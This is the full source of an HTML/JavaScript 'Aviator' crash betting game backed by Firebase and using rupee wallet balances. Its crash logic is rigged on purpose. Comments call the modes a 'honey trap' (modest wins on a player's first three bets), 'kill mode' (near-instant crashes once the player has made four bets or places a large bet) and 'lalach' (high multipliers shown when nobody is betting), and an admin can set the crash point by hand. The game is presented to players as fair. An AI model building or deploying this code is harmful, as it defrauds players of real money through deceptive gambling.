<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Aviator Pro: Chaska Logic Edition</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        /* CSS Same as before */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: #000; height: 100vh; overflow: hidden; color: #fff; display: flex; flex-direction: column; }
        .header { display: flex; justify-content: space-between; padding: 10px 15px; background: #1b1c1d; align-items: center; border-bottom: 1px solid #333; }
        .logo { color: #d11345; font-size: 18px; font-weight: 900; font-style: italic; }
        .wallet { color: #28a745; font-weight: bold; font-size: 14px; }
        .top-info { background: #141516; padding: 5px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #222; }
        .period-box { color: #aaa; font-size: 11px; font-weight: bold; }
        .history-top { display: flex; gap: 6px; padding: 5px 0; overflow-x: auto; scrollbar-width: none; }
        .hist-chip { padding: 2px 10px; border-radius: 10px; font-size: 10px; background: #2c2d30; border: 1px solid #444; flex-shrink: 0; font-weight: bold; }
        .game-canvas { position: relative; width: 100%; height: 200px; background: #000; overflow: hidden; border-bottom: 2px solid #1b1c1d; }
        #mult-text { position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%); font-size: 45px; font-weight: 900; z-index: 10; }
        #dot-object { position: absolute; bottom: 20px; left: 20px; width: 14px; height: 14px; background: #ff0040; border-radius: 50%; z-index: 25; box-shadow: 0 0 15px #ff0040; }
        #trail-svg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 5; }
        .content-area { flex-grow: 1; padding: 8px; background: #000; overflow-y: auto; }
        .bet-card { background: #1b1c1d; border-radius: 12px; padding: 10px; border: 1px solid #333; margin-bottom: 8px; }
        .controls { display: flex; gap: 8px; height: 85px; }
        .input-part { flex: 1.5; display: flex; flex-direction: column; gap: 6px; }
        .stepper { display: flex; align-items: center; background: #000; border-radius: 15px; padding: 4px 10px; border: 1px solid #444; justify-content: space-between; }
        .stepper button { background: none; border: none; color: #fff; font-size: 20px; width: 25px; cursor: pointer; }
        .stepper input { background: none; border: none; color: #fff; width: 60px; text-align: center; font-size: 14px; font-weight: bold; outline: none; }
        .chips { display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; }
        .chips div { background: #2c2d30; padding: 6px 0; border-radius: 6px; font-size: 10px; text-align: center; font-weight: bold; border: 1px solid #444; cursor: pointer; }
        .main-btn { flex: 1.2; background: #28a745; border-radius: 12px; border: none; color: #fff; font-weight: 900; font-size: 14px; cursor: pointer; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .cashout { background: #ff9800 !important; }
        .waiting-btn { background: #555 !important; }
        #game-popup { position: absolute; top: 30%; left: 50%; transform: translate(-50%, -50%) scale(0); z-index: 100; padding: 10px 30px; border-radius: 25px; transition: 0.3s; color: #fff; font-weight: 900; }
        .popup-win { background: rgba(40, 167, 69, 0.9); transform: translate(-50%, -50%) scale(1) !important; }
    </style>
</head>
<body>

<div class="header">
    <div class="logo">AVIATOR</div>
    <div id="walletDisplay" class="wallet">0.00 Rs</div>
</div>

<div class="top-info">
    <div class="period-box">#<span id="periodId">00000000</span></div>
    <div id="histLine" class="history-top"></div>
</div>

<div class="game-canvas">
    <div id="game-popup">WIN!</div>
    <svg id="trail-svg"><path id="trail-path-fill" fill="rgba(209, 19, 69, 0.3)" d="" /><path id="trail-path-line" fill="none" stroke="#d11345" stroke-width="3" d="" /></svg>
    <div id="mult-text">1.00x</div>
    <div id="dot-object"></div>
</div>

<div class="content-area">
    <div class="bet-card">
        <div class="controls">
            <div class="input-part">
                <div class="stepper"><button onclick="step('v1',-1)">-</button><input id="v1" value="10.00" readonly><button onclick="step('v1',1)">+</button></div>
                <div class="chips"><div onclick="setV('v1',10)">10</div><div onclick="setV('v1',50)">50</div><div onclick="setV('v1',100)">100</div><div onclick="setV('v1',500)">500</div></div>
            </div>
            <button id="btn1" class="main-btn" onclick="handleBet(1)"><span id="txt1">BET</span><br><span id="s1" style="font-size: 10px;">10.00 Rs</span></button>
        </div>
    </div>
    <div class="bet-card">
        <div class="controls">
            <div class="input-part">
                <div class="stepper"><button onclick="step('v2',-1)">-</button><input id="v2" value="10.00" readonly><button onclick="step('v2',1)">+</button></div>
                <div class="chips"><div onclick="setV('v2',10)">10</div><div onclick="setV('v2',50)">50</div><div onclick="setV('v2',100)">100</div><div onclick="setV('v2',500)">500</div></div>
            </div>
            <button id="btn2" class="main-btn" onclick="handleBet(2)"><span id="txt2">BET</span><br><span id="s2" style="font-size: 10px;">10.00 Rs</span></button>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = { databaseURL: "https://jalwa-v2-ad222-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const userId = localStorage.getItem('jalwa_user_phone') || "Guest";

    let wallet = 0, multiplier = 1.0, gameStatus = "waiting", targetCrash = 2.0, serverOffset = 0, currentPeriod = "";
    let bets = { 1: { active: false, amt: 0, waiting: false }, 2: { active: false, amt: 0, waiting: false } };

    db.ref(".info/serverTimeOffset").on("value", s => serverOffset = s.val() || 0);

    function getSync() {
        const now = new Date(Date.now() + serverOffset);
        const dateStr = now.getFullYear() + String(now.getMonth()+1).padStart(2,'0') + String(now.getDate()).padStart(2,'0');
        const totalSec = (now.getHours()*3600) + (now.getMinutes()*60) + now.getSeconds();
        return { period: dateStr + String(Math.floor(totalSec/20)).padStart(4,'0'), ms: (totalSec % 20) * 1000 + now.getMilliseconds() };
    }

    // --- SMART CHASKA LOGIC ---
    async function calculateSmartCrash() {
        const betSnap = await db.ref('gameSettings/aviator/liveBets').once('value');
        let totalAmt = 0;
        let highBetFound = false;

        // User ki bet count check karna
        const userStats = await db.ref('users/' + userId + '/stats').once('value');
        let betCount = (userStats.val() && userStats.val().totalBets) || 0;

        if (betSnap.exists()) {
            betSnap.forEach(snap => {
                let amt = parseFloat(snap.val().amt);
                totalAmt += amt;
                if (amt > 50) highBetFound = true; // Rule: 50 se upar ki bet = Instant Crash
            });
        }

        if (highBetFound || betCount >= 4) {
            // KILL MODE: 1.01x - 1.10x (5th bet or big bet)
            return (Math.random() * 0.09 + 1.01).toFixed(2);
        } else if (totalAmt > 0 && totalAmt <= 50 && betCount < 4) {
            // HONEY TRAP: 2x - 3x (First 3 bets)
            return (Math.random() * 1.5 + 2.0).toFixed(2);
        } else if (totalAmt === 0) {
            // LALACH: No bets = 10x+
            return (Math.random() * 5 + 10).toFixed(2);
        }
        return 1.15;
    }

    async function updateTarget() {
        const adminSnap = await db.ref('gameSettings/aviator').once('value');
        const admin = adminSnap.val();
        
        if (admin && admin.forceActive) {
            targetCrash = parseFloat(admin.manualCrash);
        } else {
            targetCrash = await calculateSmartCrash();
        }
    }

    function loop() {
        const sync = getSync();
        if (currentPeriod !== sync.period) { 
            currentPeriod = sync.period; document.getElementById('periodId').innerText = currentPeriod;
            updateTarget(); db.ref('gameSettings/aviator/liveBets').remove(); 
        }

        if (sync.ms < 5000) {
            gameStatus = "waiting"; multiplier = 1.0; resetPlane();
            document.getElementById('mult-text').innerText = "WAITING " + (5 - (sync.ms/1000)).toFixed(1) + "s";
            [1,2].forEach(id => { if(!bets[id].waiting) resetBtn(id); });
        } else if (sync.ms < 16000) {
            let time = (sync.ms - 5000) / 1000;
            multiplier = Math.pow(1.15, time * 1.5);
            if (multiplier >= targetCrash) triggerCrash();
            else {
                gameStatus = "running";
                document.getElementById('mult-text').innerText = multiplier.toFixed(2) + "x";
                [1,2].forEach(id => { 
                    if(bets[id].waiting) { 
                        bets[id].active = true; bets[id].waiting = false; 
                        document.getElementById('btn'+id).className = "main-btn cashout"; 
                        document.getElementById('txt'+id).innerText = "CASH OUT"; 
                    }
                    if(bets[id].active) document.getElementById('s'+id).innerText = (bets[id].amt * multiplier).toFixed(2) + " Rs";
                });
                updatePlanePos(time * 30);
            }
        } else triggerCrash();
        requestAnimationFrame(loop);
    }

    function triggerCrash() {
        if(gameStatus === "flew") return;
        gameStatus = "flew"; document.getElementById('mult-text').innerText = "FLEW AWAY!";
        [1,2].forEach(id => { if(bets[id].active) resetBtn(id); });
        db.ref('gameSettings/aviator/history').push(parseFloat(multiplier).toFixed(2));
    }

    function updatePlanePos(f) {
        let x = 20 + (f * 2.5), y = 20 + (Math.pow(f / 15, 2.3));
        let dot = document.getElementById('dot-object');
        dot.style.left = Math.min(x, 280) + "px"; dot.style.bottom = Math.min(y, 180) + "px";
        document.getElementById('trail-path-line').setAttribute('d', `M 20 180 Q 80 180 ${x} ${200-y}`);
        document.getElementById('trail-path-fill').setAttribute('d', `M 20 200 Q 80 200 ${x} ${200-y} L ${x} 200 Z`);
    }

    function resetPlane() { 
        document.getElementById('dot-object').style.left = "20px"; document.getElementById('dot-object').style.bottom = "20px";
        document.getElementById('trail-path-line').setAttribute('d', ""); document.getElementById('trail-path-fill').setAttribute('d', "");
    }

    window.setV = (id, v) => { document.getElementById(id).value = parseFloat(v).toFixed(2); document.getElementById('s' + id.slice(-1)).innerText = v.toFixed(2) + " Rs"; };
    window.step = (id, s) => { let v = parseFloat(document.getElementById(id).value); setV(id, s === 1 ? v*2 : Math.max(1, v/2)); };

    window.handleBet = (id) => {
        let val = parseFloat(document.getElementById('v'+id).value);
        if(gameStatus === "waiting" && !bets[id].waiting && wallet >= val) {
            // Player ki bet history update karna
            db.ref('users/' + userId + '/stats/totalBets').transaction(c => (c || 0) + 1);
            
            db.ref('users/'+userId).transaction(u => { if(u) u.balance -= val; return u; });
            db.ref('gameSettings/aviator/liveBets/' + userId + '_' + id).set({ amt: val });
            bets[id].amt = val; bets[id].waiting = true;
            document.getElementById('btn'+id).className = "main-btn waiting-btn"; document.getElementById('txt'+id).innerText = "WAITING";
        } else if(gameStatus === "running" && bets[id].active) {
            let win = bets[id].amt * multiplier;
            db.ref('users/'+userId).transaction(u => { if(u) u.balance += win; return u; });
            db.ref('gameSettings/aviator/liveBets/' + userId + '_' + id).remove();
            let p = document.getElementById('game-popup'); p.innerText = "WIN â‚¹" + win.toFixed(2); p.className = "popup-win";
            setTimeout(()=>p.className="", 2000); resetBtn(id);
        }
    };

    function resetBtn(id) { bets[id].active = false; bets[id].waiting = false; document.getElementById('btn'+id).className = "main-btn"; document.getElementById('txt'+id).innerText = "BET"; document.getElementById('s'+id).innerText = document.getElementById('v'+id).value + " Rs"; }
    
    db.ref('users/'+userId+'/balance').on('value', s => { wallet = s.val() || 0; document.getElementById('walletDisplay').innerText = wallet.toFixed(2) + " Rs"; });
    db.ref('gameSettings/aviator/history').limitToLast(10).on('value', s => {
        let h = ""; s.forEach(c => { h = `<div class="hist-chip" style="color:${c.val()>=2?'#9b59b6':'#3498db'}">${c.val()}x</div>` + h; });
        document.getElementById('histLine').innerHTML = h;
    });

    requestAnimationFrame(loop);
</script>
</body>
</html>
